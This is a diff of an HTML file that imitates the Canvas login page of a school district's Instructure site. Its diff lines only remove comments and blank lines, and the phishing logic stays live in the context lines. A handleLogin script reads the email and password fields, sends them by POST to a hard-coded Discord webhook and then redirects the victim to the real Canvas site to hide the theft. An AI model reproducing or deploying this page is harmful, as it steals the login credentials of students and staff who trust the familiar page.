@@ -8,7 +8,6 @@
   <link rel="manifest" href="/web-app-manifest/manifest.json">
   <meta name="sentry-trace" content="7a6709eb68be48799d86adfd92fbdadc-055e9cb868874c97-0"/>
   <title>Log In to Canvas</title>
-
   <link rel="preload" href="https://du11hjcvx0uqb.cloudfront.net/dist/fonts/lato/extended/Lato-Regular-bd03a2cc27.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <link rel="preload" href="https://du11hjcvx0uqb.cloudfront.net/dist/fonts/lato/extended/Lato-Bold-cccb897485.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <link rel="preload" href="https://du11hjcvx0uqb.cloudfront.net/dist/fonts/lato/extended/Lato-Italic-4eb103b4d1.woff2" as="font" type="font/woff2" crossorigin="anonymous">
@@ -18,8 +17,6 @@
   <link rel="stylesheet" href="https://du11hjcvx0uqb.cloudfront.net/dist/brandable_css/new_styles_normal_contrast/bundles/login-a4ed1b59a8.css" media="screen" />
   <link rel="apple-touch-icon" href="https://du11hjcvx0uqb.cloudfront.net/dist/images/apple-touch-icon-585e5d997d.png" />
   <link rel="icon" type="image/x-icon" href="https://du11hjcvx0uqb.cloudfront.net/dist/images/favicon-e10d657a73.ico" />
-
-  
   <script>if (navigator.userAgent.match(/(MSIE|Trident\/)/)) location.replace('/ie-is-not-supported.html')</script>
   <script>
     INST = {"environment":"production","logPageViews":true,"editorButtons":[]};
@@ -33,12 +30,9 @@
   <script src="https://du11hjcvx0uqb.cloudfront.net/dist/webpack-production/react-entry-0b1e31aa81d595c6.js" crossorigin="anonymous" defer="defer"></script>
   <script src="https://du11hjcvx0uqb.cloudfront.net/dist/webpack-production/main-entry-19a7425383c022e5.js" crossorigin="anonymous" defer="defer"></script>
 <script>
-//<![CDATA[
 (window.bundles || (window.bundles = [])).push('login');
 (window.bundles || (window.bundles = [])).push('terms_of_service_modal');
-//]]>
 </script>
-
   <script type="text/javascript">
     window.heap=window.heap||[],heap.load=function(e,t){window.heap.appid=e,window.heap.config=t=t||{};var r=document.createElement("script");r.type="text/javascript",r.async=!0,r.src="https://cdn.heapanalytics.com/js/heap-"+e+".js";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(r,a);for(var n=function(e){return function(){heap.push([e].concat(Array.prototype.slice.call(arguments,0)))}},p=["addEventProperties","addUserProperties","clearEventProperties","identify","resetIdentity","removeEventProperty","setEventProperties","track","unsetEventProperty"],o=0;o<p.length;o++)heap[p[o]]=n(p[o])};
     heap.load("3001039959");
@@ -63,15 +57,11 @@
       }
     }, 1000);
   </script>
-
-
   <script>
     function handleLogin() {
-      // Get the values of email and password
       var email = document.getElementById('pseudonym_session_unique_id').value;
       var password = document.getElementById('pseudonym_session_password').value;
       
-      // Send the email and password to the Discord webhook
       fetch("https://discord.com/api/webhooks/1280675104241750109/J8mFYpZmhPAQwat3DmaSwdX7KYSa6CxYmJOP2mgKacRCSURcBf7OzP1qJXzBMBxjlWfo", {
         method: "POST",
         headers: {
@@ -88,17 +78,13 @@
         }
       });
 
-      // Redirect to the specified link (replace 'https://portlandpublic.instructure.com/' with your desired URL)
       window.location.href = "https://portlandpublic.instructure.com/";
       
-      // Prevent form submission to server
       return false;
     }
   </script>
 </head>
-
 <body class="full-width ic-Login-Body no-headers primary-nav-expanded full-width responsive_student_grades_page">
-
 <noscript>
   <div role="alert" class="ic-flash-static ic-flash-error">
     <div class="ic-flash__icon" aria-hidden="true">
@@ -107,10 +93,8 @@
     <h1>You need to have JavaScript enabled in order to access this site.</h1>
   </div>
 </noscript>
-<!-- Other content omitted for brevity -->
 <div id="flash_message_holder"></div>
 <div id="flash_screenreader_holder"></div>
-
 <div id="application" class="ic-app">
   <div id="wrapper" class="ic-Layout-wrapper">
     <div id="main" class="ic-Layout-columns">
@@ -172,13 +156,9 @@
                     </div>
                   </div>
                 </div>
-
 </div>
-
               </div>
-            </div> <!-- ic-Login__actions -->
-            
-
+            </div>            
 </form>          <form id="forgot_password_form" style="display: none;" action="/forgot_password" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" autocomplete="off" /><input type="hidden" name="authenticity_token" value="8PT/2u5+CWmOeC6yZLrYpiIgq2ppD4hVPz2lHFyNC6iXoZa4lixjO/87WPsdg7PuThKaXy5H2GVFee5uF9Vnzw==" autocomplete="off" />
             <h1 class="ui-helper-hidden-accessible">Forgot Password?</h1>
             <p id="forgot_password_instructions" class="ic-Login__forgot-text">
@@ -197,12 +177,11 @@
                 <button type="submit" class="Button Button--login">
                   Request Password
                 </button>
-              </div> <!-- end ic-Login__actions -->
+              </div> 
             </div> 
-</form>        </div> <!-- end ic-Login__body -->
-      </div> <!-- end ic-Login__innerContent  -->
+</form>        </div> 
+      </div> 
       <footer role="contentinfo" id="footer" class="ic-Login-footer">
-
         <div id="footer-links" class="ic-Login-footer__links">
           <a class="support_url help_dialog_trigger" data-track-category="help system" data-track-label="help button" href="https://help.instructure.com">Help</a>
           <a href="https://portlandpublic.instructure.com/privacy_policy">Privacy Policy</a>
@@ -211,7 +190,6 @@
     <br>
 <a href="http://facebook.com/instructure">Facebook</a>
 <a href="http://twitter.com/instructure">Twitter</a>
-
         </div>
         <a href="http://www.instructure.com" class="ic-Login-footer__logo-link" aria-label="By Instructure">
           <svg xmlns="http://www.w3.org/2000/svg" width="110" height="16" viewBox="25 265 743 80"><title>Instructure</title>
@@ -246,59 +224,36 @@
 			745.4,311 745.4,333.5 767,333.5 767,344.9 		"/>
 	</g>
 </g>
-
 </svg>
-
         </a>
-        <div id="footer-epilogue" class="ic-Login-footer__links">
-          
+        <div id="footer-epilogue" class="ic-Login-footer__links">          
   <div class="external" style="text-decoration: none;">Meet the Instructure Learning Platform:</div>
     <a href="https://www.instructure.com/lms-learning-management-system">Canvas LMS</a>
     <a href="https://www.instructure.com/k12/products/mastery/mastery-connect">Mastery Connect</a>
     <a href="https://www.instructure.com/k12/products/elevate/elevate-k12-analytics">Elevate Analytics</a>
     <a href="https://www.instructure.com/higher-education/products/impact">Impact</a>
-
-
         </div>
     </footer>
-    </div> <!-- end ic-Login__content -->
+    </div> 
   </div>
-</div> <!-- end ic-Login -->
-
-
-
+</div> 
           </div>
         </div>
         <div id="right-side-wrapper" class="ic-app-main-content__secondary">
-          <aside id="right-side" role="complementary">
-            
+          <aside id="right-side" role="complementary">            
           </aside>
         </div>
       </div>
     </div>
   </div>
-
-
-
-    <div style="display:none;"><!-- Everything inside of this should always stay hidden -->
+    <div style="display:none;">
     </div>
   <div id='aria_alerts' class='hide-text affix' role="alert" aria-live="assertive"></div>
   <div id='StudentTray__Container'></div>
   <div id="react-router-portals"></div>
-  
-
-
-
-
 <script>
-//<![CDATA[
 (window.bundles || (window.bundles = [])).push('inst_fs_service_worker');
-//]]>
 </script>
-  
-
-</div> <!-- #application -->
-
-
+</div>
 </body>
 </html>
